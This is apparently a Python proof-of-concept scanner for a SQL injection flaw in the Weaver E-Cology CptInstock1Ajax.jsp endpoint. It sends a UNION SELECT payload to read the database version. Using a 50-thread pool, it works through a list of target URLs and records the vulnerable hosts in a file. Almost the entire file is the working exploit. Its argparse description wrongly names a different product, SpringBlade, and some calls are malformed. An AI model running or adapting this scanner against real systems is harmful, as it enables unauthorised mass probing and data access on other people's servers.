#泛微E-Cology系统接口CptInstock1Ajax存在SQL注入漏洞
import requests,argparse,sys,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() 
def poc(target):
    payload="/cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+@@VERSION,1#"
    headers1={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    hearders2={
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
    
    }
    try:
        res1=requests.get(url=target,timeout=5,verify=False,headers=headers1)
        if res1.status_code ==200:
            res2=requests.get(url=target+payload,timeout=5,verify=False,headers=hearders2)
            if 'SQL Server' in res2.text:
                print(f"[+]{target}存在SQL注入")
                with open('r1.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在SQL注入")
        else:
            print(f"[*]{target}访问有问题，请手工访问")
    except:
        pass 

def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="SpringBlade api/blade-system/menu/list接口存在SQL注入")
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close
        mp.join
        
    else:
        print(f"Usage: Python {sys.argv[0]}  -h")

if __name__ =="__main__":
    main()
